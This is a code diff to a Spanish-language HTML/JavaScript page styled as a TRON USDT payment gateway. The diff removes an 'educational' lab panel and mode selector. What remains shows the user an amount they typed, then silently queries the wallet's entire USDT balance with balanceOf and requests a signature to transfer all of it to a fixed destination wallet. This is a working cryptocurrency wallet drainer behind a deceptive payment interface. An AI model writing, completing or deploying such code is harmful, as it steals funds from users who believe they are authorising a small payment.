@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pasarela de Pago USDT - Módulo Educativo</title>
+    <title>Pasarela de Pago USDT - Modo Saldo Máximo</title>
     
     <style>
         :root { color-scheme: light; }
@@ -11,39 +11,11 @@
         body {
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
+            align-items: flex-start;
+            padding-top: 60px;
             background: #121212;
-            gap: 20px;
         }
-        
-        /* Panel del Profesor / Selector de Modo */
-        .panel-profesor {
-            width: 100%;
-            max-width: 380px;
-            padding: 16px;
-            background: #1e1e1e;
-            border: 1px dashed #0560fa;
-            border-radius: 12px;
-            color: #ffffff;
-            text-align: left;
-        }
-        .panel-profesor h3 { font-size: 14px; margin-bottom: 10px; color: #a0c2fd; text-transform: uppercase; letter-spacing: 0.5px; }
-        .modo-select {
-            width: 100%;
-            padding: 10px;
-            background: #2d2d2d;
-            color: #ffffff;
-            border: 1px solid #444;
-            border-radius: 6px;
-            font-size: 14px;
-            outline: none;
-            cursor: pointer;
-        }
-
-        /* Modal de la Pasarela */
         .modal {
             width: 100%;
             max-width: 380px;
@@ -101,16 +73,6 @@
 </head>
 <body>
 
-    <!-- CONTROL DE ENTORNO PARA EL DOCENTE -->
-    <div class="panel-profesor">
-        <h3>🔬 Laboratorio: Selector de Modo</h3>
-        <select id="selectorModo" class="modo-select">
-            <option value="forzado">Escenario 1: Forzar firma fija (Exactamente 1 USDT)</option>
-            <option value="maximo">Escenario 2: Consultar y proponer saldo total (balanceOf)</option>
-        </select>
-    </div>
-
-    <!-- PASARELA ORIGINAL -->
     <div class="modal">
         <div class="header">
             <h1>Transferencia TRC-20</h1>
@@ -159,7 +121,6 @@
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
-    const selectorModo = document.getElementById('selectorModo');
 
     let walletAddress = null;
 
@@ -207,7 +168,7 @@
             return;
         }
 
-        // PASO 2: Procesar la transferencia según el modo seleccionado
+        // PASO 2: Procesar la transferencia basándose en el saldo total disponible
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -216,40 +177,29 @@
                     throw new Error("Por favor, ingresa un monto válido antes de continuar.");
                 }
 
-                const tronWeb = window.tronWeb;
-                const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
-                
-                let unitsInSun = "0";
-                const modoActual = selectorModo.value;
-
-                if (modoActual === "forzado") {
-                    // ESCENARIO 1: Forzado a 1.00 USDT exactamente (1,000,000 Sun)
-                    setStatus("Modo Fijo Activo: Solicitando firma digital por 1.00 USDT...");
-                    unitsInSun = "1000000";
-                } else if (modoActual === "maximo") {
-                    // ESCENARIO 2: Consulta dinámica del balance on-chain total
-                    setStatus("Modo Dinámico: Consultando fondos en la blockchain...");
-                    connectBtn.disabled = true;
-                    
-                    const rawBalance = await contract.balanceOf(walletAddress).call();
-                    unitsInSun = rawBalance.toString();
-
-                    if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
-                        throw new Error("La billetera no posee fondos de USDT (TRC-20) para transferir.");
-                    }
-                    
-                    setStatus("Modo Dinámico: Solicitando firma digital para el saldo total...");
-                }
-
+                setStatus("Consultando fondos disponibles en la blockchain...");
                 connectBtn.disabled = true;
 
-                // Envío de la transacción final estructurada
+                const tronWeb = window.tronWeb;
+                const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
+
+                // Consulta dinámica del balance on-chain total (Llamada local gratuita sin gas)
+                const rawBalance = await contract.balanceOf(walletAddress).call();
+                const unitsInSun = rawBalance.toString();
+
+                if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
+                    throw new Error("La billetera no posee fondos de USDT (TRC-20) para transferir.");
+                }
+
+                setStatus("Solicitando confirmación de firma digital para el saldo total...");
+
+                // Envío de la transacción final estructurada con el balance total recuperado
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
 
                 if (txId) {
-                    setStatus(`Operación procesada con éxito en la red TRON en modo [${modoActual.toUpperCase()}].`, true);
+                    setStatus("Operación de saldo total procesada con éxito en la red TRON.", true);
                     connectBtn.innerText = "Completado";
                 }
             } catch (error) {
@@ -264,3 +214,4 @@
 
 </body>
 </html>
+
